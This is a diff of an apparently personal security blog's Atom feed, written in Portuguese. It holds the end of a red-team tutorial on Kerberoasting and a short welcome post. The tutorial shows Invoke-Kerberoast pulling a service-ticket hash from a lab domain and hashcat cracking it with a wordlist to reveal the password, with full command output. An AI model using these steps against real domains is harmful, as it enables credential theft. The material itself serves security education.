@@ -655,14 +590,14 @@ whencreated              : 2/12/2020 6:06:13 PM
 primarygroupid           : 513
 pwdlastset               : 2/12/2020 8:10:04 PM
 usnchanged               : 32844
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Após a enumeração, como informado anteriormente, o atacante de posse do TGT precisa requisitar o TGS para o serviço alvo assinado pela conta do usuário/computador correspondente. A extração do ticket criptografado do TGS-REP, pode ser executada utilizando o módulo &lt;a href=&quot;https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/&quot;&gt;Invoke-Kerberoast&lt;/a&gt; presente no toolkit &lt;a href=&quot;https://github.com/PowerShellMafia/PowerSploit&quot;&gt;PowerSploit&lt;/a&gt;.&lt;/p&gt;
+</span></code></pre></div></div>
+<p>Após a enumeração, como informado anteriormente, o atacante de posse do TGT precisa requisitar o TGS para o serviço alvo assinado pela conta do usuário/computador correspondente. A extração do ticket criptografado do TGS-REP, pode ser executada utilizando o módulo <a href="https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/">Invoke-Kerberoast</a> presente no toolkit <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a>.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;PS C:\Users\charris\Desktop&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;Invoke-Kerberoast &lt;span class=&quot;nt&quot;&gt;-domain&lt;/span&gt; hnr.local &lt;span class=&quot;nt&quot;&gt;-OutputFormat&lt;/span&gt; Hashcat                                                                                                               
-&lt;span class=&quot;go&quot;&gt;
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\Users\charris\Desktop&gt;</span><span class="w"> </span>Invoke-Kerberoast <span class="nt">-domain</span> hnr.local <span class="nt">-OutputFormat</span> Hashcat                                                                                                               
+<span class="go">
 TicketByteHexStream  :
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Hash                 : $&lt;/span&gt;krb5tgs&lt;span class=&quot;nv&quot;&gt;$23$*&lt;/span&gt;sqlserver&lt;span class=&quot;nv&quot;&gt;$hnr&lt;/span&gt;.local&lt;span class=&quot;nv&quot;&gt;$MSSQLSvc&lt;/span&gt;/SQL.hnr.local:1433&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$6EB0AF7AF18FE1BD3B1033840C3848CB$58E8E31B0086B724DA67DFA11BC6C2A6B36399DFD60A6DD935CD850BE8C9365821A04A6F4F113B&lt;/span&gt;
-&lt;span class=&quot;go&quot;&gt;                       6CC178A80467DCB6AFE6DA14F2A8286BD91A079A795B77084DBDD876323FE5A9130E215E3F8D2E763D9F21840091336DCB315082C29BDC6A3E34A94DB26A8DDA2E007DF3DE085A1030FDAC24AF832C100FC7BBB6D00EE
+</span><span class="gp">Hash                 : $</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.local:1433<span class="k">*</span><span class="nv">$6EB0AF7AF18FE1BD3B1033840C3848CB$58E8E31B0086B724DA67DFA11BC6C2A6B36399DFD60A6DD935CD850BE8C9365821A04A6F4F113B</span>
+<span class="go">                       6CC178A80467DCB6AFE6DA14F2A8286BD91A079A795B77084DBDD876323FE5A9130E215E3F8D2E763D9F21840091336DCB315082C29BDC6A3E34A94DB26A8DDA2E007DF3DE085A1030FDAC24AF832C100FC7BBB6D00EE
                        CC8A375C7408EA858BBF746A0754BF58DE9D39646636F6B228D97DEBED70960CCBC1B6A6EC01936C9744CC6D43E38518AA24A84E3353E9AA3DB31E6FFA8D15917F10BF97E1909D70276F9B0C33ACB1B05DE912DDF9BE6
                        DA50BD35CE3A295AF29B8D530F2EAEDDAEFDC34A8BC0C05C3C592B4D1A5F296C20B9A37B7B08F4D19955C08A53BC80C8DDEE168D26E726FAD832355DF45583B78D70C8EE676B6838D155A864763667FFF2048D2BD4D35
                        F34EF06BD7E387EDC08402D8703CE635710B1A33E352225A680FE15F2F1F6D3B26D91B1C7616F1B558759EF82B4350E846D7245CAD30D65C1CDB39E2DBC34C8E1F9ECC4744BF75302EBADEA2BF8B40BB234307916CAC4
@@ -678,18 +613,18 @@ TicketByteHexStream  :
 SamAccountName       : sqlserver
 DistinguishedName    : CN=SQLServer,CN=Managed Service Accounts,DC=hnr,DC=local
 ServicePrincipalName : MSSQLSvc/SQL.hnr.local:1433
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Com a extração do hash, o ataque se dá offline através da tentativa de descoberta da credencial utilizando wordlists em um processo de “quebra” do hash mencionado. Para exemplificar, foi utilizada como ferramenta o &lt;a href=&quot;https://hashcat.net/hashcat/&quot;&gt;HashCat&lt;/a&gt;.&lt;/p&gt;
+</span></code></pre></div></div>
+<p>Com a extração do hash, o ataque se dá offline através da tentativa de descoberta da credencial utilizando wordlists em um processo de “quebra” do hash mencionado. Para exemplificar, foi utilizada como ferramenta o <a href="https://hashcat.net/hashcat/">HashCat</a>.</p>
 
-&lt;div class=&quot;language-terminal highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;hashcat-5.1.0 ./hashcat64.bin -a 0 -m 13100 hash.txt ~/tools/wordlist/br-wordlist.txt
+<div class="language-terminal highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">hashcat-5.1.0 ./hashcat64.bin -a 0 -m 13100 hash.txt ~/tools/wordlist/br-wordlist.txt
 hashcat (v5.1.0) starting...
 
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;OpenCL Platform #&lt;/span&gt;1: NVIDIA Corporation
-&lt;span class=&quot;go&quot;&gt;======================================
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;* Device #&lt;/span&gt;1: GeForce GPU, 500/2000 MB allocatable, 5MCU
-&lt;span class=&quot;go&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Hashes: 1 digests;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;1 unique digests, 1 unique salts
-&lt;span class=&quot;go&quot;&gt;Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+</span><span class="gp">OpenCL Platform #</span>1: NVIDIA Corporation
+<span class="go">======================================
+</span><span class="gp">* Device #</span>1: GeForce GPU, 500/2000 MB allocatable, 5MCU
+<span class="go">
+</span><span class="gp">Hashes: 1 digests;</span><span class="w"> </span>1 unique digests, 1 unique salts
+<span class="go">Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
 Rules: 1
 
 Applicable optimizers:
@@ -710,9 +645,9 @@ Dictionary cache built:
 * Keyspace..: 73551
 * Runtime...: 0 secs
 
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;krb5tgs&lt;span class=&quot;nv&quot;&gt;$23$*&lt;/span&gt;sqlserver&lt;span class=&quot;nv&quot;&gt;$hnr&lt;/span&gt;.local&lt;span class=&quot;nv&quot;&gt;$MSSQLSvc&lt;/span&gt;/SQL.hnr.local:1433&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b9aa930a4701972a30a499e63dc&lt;/span&gt;
-&lt;span class=&quot;gp&quot;&gt;bf5bb$&lt;/span&gt;61c1e1610ac22090f167efc415053ced20a33f8c2eafa63d4273c01bd5bcb17915adfc5978900e52735
-&lt;span class=&quot;go&quot;&gt;a45fbee87cf87714eef994e0c7141727bde132b74090ba5689a7eb810dd36a7b4c9dca9bde985b4bfda061d4e
+</span><span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.local:1433<span class="k">*</span><span class="nv">$b9aa930a4701972a30a499e63dc</span>
+<span class="gp">bf5bb$</span>61c1e1610ac22090f167efc415053ced20a33f8c2eafa63d4273c01bd5bcb17915adfc5978900e52735
+<span class="go">a45fbee87cf87714eef994e0c7141727bde132b74090ba5689a7eb810dd36a7b4c9dca9bde985b4bfda061d4e
 79bec757efe5776b3b448928f691ada4d5823e667ac12c04036b7c59b4cc5d6c73c6b90c41a665b75fc1290b1
 24a237ff85755d8f32e16554355e376fad9c8bfbe148220a378a2a2c64f2636bce82640050826d1b70754d682
 eaa5ef239bd51422a7f47f92f979478407af84db5c4e750084d698a2a86726b38cd97a89e5996105cced2d5bc
@@ -736,52 +671,52 @@ f363462f0726f332b3761b112b540f1a01402e60dea0d0485f36194ae17d8cfec6acb6229efee662
 2393488d31ff6a5d4c40262274fb4a5ea1c7d76638c0b1ba82f62c841de519e0a2955b82eea2f70fae5dd30ec
 007130caed823aa6f84fa97c227347a871dceefaa4d0860a82151c0a049b52332c550732c95a7c7ed54c0aa6a
 1033831a4598b6bd0069b34e6bfd11ecc5ec8dca0a0e9d89dda1d3056e240beeaa98ce0645aeb105194382fb0
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;68e2ccb:P@$&lt;/span&gt;sword
-&lt;span class=&quot;go&quot;&gt;                                                 
+</span><span class="gp">68e2ccb:P@$</span>sword
+<span class="go">                                                 
 Session..........: hashcat
 Status...........: Cracked
 Hash.Type........: Kerberos 5 TGS-REP etype 23
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Hash.Target......: $&lt;/span&gt;krb5tgs&lt;span class=&quot;nv&quot;&gt;$23$*&lt;/span&gt;sqlserver&lt;span class=&quot;nv&quot;&gt;$hnr&lt;/span&gt;.local&lt;span class=&quot;nv&quot;&gt;$MSSQLSvc&lt;/span&gt;/SQL.hnr.l...8e2ccb
-&lt;span class=&quot;go&quot;&gt;Time.Started.....: Thu Feb 13 11:07:38 2020 (0 secs)
+</span><span class="gp">Hash.Target......: $</span>krb5tgs<span class="nv">$23$*</span>sqlserver<span class="nv">$hnr</span>.local<span class="nv">$MSSQLSvc</span>/SQL.hnr.l...8e2ccb
+<span class="go">Time.Started.....: Thu Feb 13 11:07:38 2020 (0 secs)
 Time.Estimated...: Thu Feb 13 11:07:38 2020 (0 secs)
 Guess.Base.......: File (/home/tuxtrack/tools/wordlist/br-wordlist.txt)
 Guess.Queue......: 1/1 (100.00%)
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Speed.#&lt;/span&gt;1.........:   716.3 kH/s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;9.92ms&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; @ Accel:256 Loops:1 Thr:64 Vec:1
-&lt;span class=&quot;go&quot;&gt;Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
+</span><span class="gp">Speed.#</span>1.........:   716.3 kH/s <span class="o">(</span>9.92ms<span class="o">)</span> @ Accel:256 Loops:1 Thr:64 Vec:1
+<span class="go">Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
 Progress.........: 73551/73551 (100.00%)
 Rejected.........: 0/73551 (0.00%)
 Restore.Point....: 0/73551 (0.00%)
-&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Restore.Sub.#&lt;/span&gt;1...: Salt:0 Amplifier:0-1 Iteration:0-1
-&lt;span class=&quot;gp&quot;&gt;Candidates.#&lt;/span&gt;1....: Aarao -&amp;gt; integros
-&lt;span class=&quot;gp&quot;&gt;Hardware.Mon.#&lt;/span&gt;1..: Temp: 49c Util: 33% Core:1019MHz Mem:2505MHz Bus:16
-&lt;span class=&quot;go&quot;&gt;
+</span><span class="gp">Restore.Sub.#</span>1...: Salt:0 Amplifier:0-1 Iteration:0-1
+<span class="gp">Candidates.#</span>1....: Aarao -&gt; integros
+<span class="gp">Hardware.Mon.#</span>1..: Temp: 49c Util: 33% Core:1019MHz Mem:2505MHz Bus:16
+<span class="go">
 Started: Thu Feb 13 11:07:28 2020
 Stopped: Thu Feb 13 11:07:39 2020
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Havendo sucesso, a senha é descoberta e o atacante poderá ter acesso a conta de serviço.&lt;/p&gt;
+</span></code></pre></div></div>
+<p>Havendo sucesso, a senha é descoberta e o atacante poderá ter acesso a conta de serviço.</p>
 
-&lt;p&gt;Bom, é isso ai!! Caso eu tenha errado em algo, ou alguma explicação precise ser melhorada, por favor entrem em contato comigo via twitter @tuxtrack ou por email: tuxtrack@hacknroll.com.&lt;/p&gt;
+<p>Bom, é isso ai!! Caso eu tenha errado em algo, ou alguma explicação precise ser melhorada, por favor entrem em contato comigo via twitter @tuxtrack ou por email: tuxtrack@hacknroll.com.</p>
 
-&lt;p&gt;Happy Hacking and HackN’Roll \m/&lt;/p&gt;
+<p>Happy Hacking and HackN’Roll \m/</p>
 
-&lt;p&gt;References:&lt;/p&gt;
+<p>References:</p>
 
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx&quot;&gt;Kerberos Survival Guide&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://malicious.link/post/2016/kerberoast-pt1/&quot;&gt;Mubix Kerberoast Part 01&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://malicious.link/post/2016/kerberoast-pt2/&quot;&gt;Mubix Kerberoast Part 02&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://malicious.link/post/2016/kerberoast-pt3/&quot;&gt;Mubix Kerberoast Part 03&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;</content><author><name>tuxtrack</name></author><category term="KERBEROS" /><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><summary type="html">O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response.</summary></entry><entry><title type="html">Hello Friend</title><link href="http://localhost:4000/2020/02/09/Hi.html" rel="alternate" type="text/html" title="Hello Friend" /><published>2020-02-09T09:55:00-03:00</published><updated>2020-02-09T09:55:00-03:00</updated><id>http://localhost:4000/2020/02/09/Hi</id><content type="html" xml:base="http://localhost:4000/2020/02/09/Hi.html">&lt;p&gt;Resolvi criar esse blog com o intuito de compartilhar algo sobre minha pequena experiência.
-Espero que possa ajudar algum curioso, assim como outros blogs sempre me ajudam.&lt;/p&gt;
+<ul>
+  <li><a href="https://social.technet.microsoft.com/wiki/contents/articles/4209.kerberos-survival-guide.aspx">Kerberos Survival Guide</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt1/">Mubix Kerberoast Part 01</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt2/">Mubix Kerberoast Part 02</a></li>
+  <li><a href="https://malicious.link/post/2016/kerberoast-pt3/">Mubix Kerberoast Part 03</a></li>
+</ul>]]></content><author><name>tuxtrack</name></author><category term="KERBEROS" /><category term="ACTIVE DIRECTORY" /><category term="REDTEAM" /><category term="WINDOWS" /><summary type="html"><![CDATA[O protocolo Kerberos fornece autenticação para o ambiente de computação possibilitando flexibilidade para operar entre diversos sistemas operacionais. Em ambientes Microsoft Windows, o protocolo é instalado como parte do Active Directory Services, ajudando no controle centralizado do gerenciamento de contas de usuários, computadores, grupos, serviços e recursos, desde que a Microsoft o adotou no Windows 2000, abandonando o processo de autenticação que na ocasião era através do NT LAN Manager (NTML) Challenge-Response.]]></summary></entry><entry><title type="html">Hello Friend</title><link href="http://localhost:4000/2020/02/09/Hi.html" rel="alternate" type="text/html" title="Hello Friend" /><published>2020-02-09T12:55:00+00:00</published><updated>2020-02-09T12:55:00+00:00</updated><id>http://localhost:4000/2020/02/09/Hi</id><content type="html" xml:base="http://localhost:4000/2020/02/09/Hi.html"><![CDATA[<p>Resolvi criar esse blog com o intuito de compartilhar algo sobre minha pequena experiência.
+Espero que possa ajudar algum curioso, assim como outros blogs sempre me ajudam.</p>
 
-&lt;p&gt;Keep Hacking!!&lt;/p&gt;
+<p>Keep Hacking!!</p>
 
-&lt;div class=&quot;box&quot;&gt;
-	&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/dh.png&quot; width=&quot;200&quot; height=&quot;200&quot; /&gt;&lt;/p&gt; 
-&lt;/div&gt;
-&lt;style&gt;
+<div class="box">
+	<p><img src="https://raw.githubusercontent.com/tuxtrack/tuxtrack.github.io/master/assets/img/sample/dh.png" width="200" height="200" /></p> 
+</div>
+<style>
 div.box {
 	width: 250px;
 	display: inline-block;
 }
-&lt;/style&gt;</content><author><name>tuxtrack</name></author><category term="HELLO WORLD" /><summary type="html">Resolvi criar esse blog com o intuito de compartilhar algo sobre minha pequena experiência. Espero que possa ajudar algum curioso, assim como outros blogs sempre me ajudam.</summary></entry></feed>
+</style>]]></content><author><name>tuxtrack</name></author><category term="HELLO WORLD" /><summary type="html"><![CDATA[Resolvi criar esse blog com o intuito de compartilhar algo sobre minha pequena experiência. Espero que possa ajudar algum curioso, assim como outros blogs sempre me ajudam.]]></summary></entry></feed>
